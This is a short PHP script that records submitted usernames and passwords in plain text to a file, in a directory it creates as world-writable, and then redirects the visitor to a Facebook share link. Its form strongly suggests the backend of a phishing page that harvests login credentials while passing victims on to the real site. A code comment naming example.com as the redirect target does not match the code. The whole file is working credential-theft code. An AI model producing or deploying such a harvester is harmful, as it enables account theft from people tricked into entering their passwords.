<?php
// Define the directory and file path
$dir = 'user_data';
$file = 'user_data/user_data.txt';

// Create the directory if it doesn't exist
if (!is_dir($dir)) {
    mkdir($dir, 0777, true);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    // Format the user data
    $userData = "Username: $user\nPassword: $pass\n \n================================\n\n";

    // Append the data to the file
    file_put_contents($file, $userData, FILE_APPEND);

    // Redirect to example.com
    header("Location: https://www.facebook.com/share/r/m6b8g1P2tAKKjwim/?mibextid=xCPwDs");
    exit(); // Make sure no further output is sent after redirection
}
?>
